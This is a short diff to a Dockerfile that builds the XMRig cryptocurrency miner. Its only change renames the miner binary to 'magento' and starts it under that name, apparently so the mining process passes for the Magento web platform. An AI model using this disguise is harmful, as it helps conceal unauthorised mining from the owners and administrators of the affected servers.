@@ -12,10 +12,11 @@ RUN cmake .. && \
 
 RUN mkdir /xmrig /xmrig/configs && \
     cp xmrig /xmrig && \
+    mv /xmrig/xmrig /xmrig/magento && \
     cp config.json /xmrig/configs
 RUN rm -rf /xmrig-C3
 RUN apt-get purge -y git build-essential cmake && \
     apt-get autoremove -y
 
 WORKDIR /xmrig
-CMD ["/xmrig/xmrig", "--config=/xmrig/configs/config.json"]
+CMD ["/xmrig/magento", "--config=/xmrig/configs/config.json"]
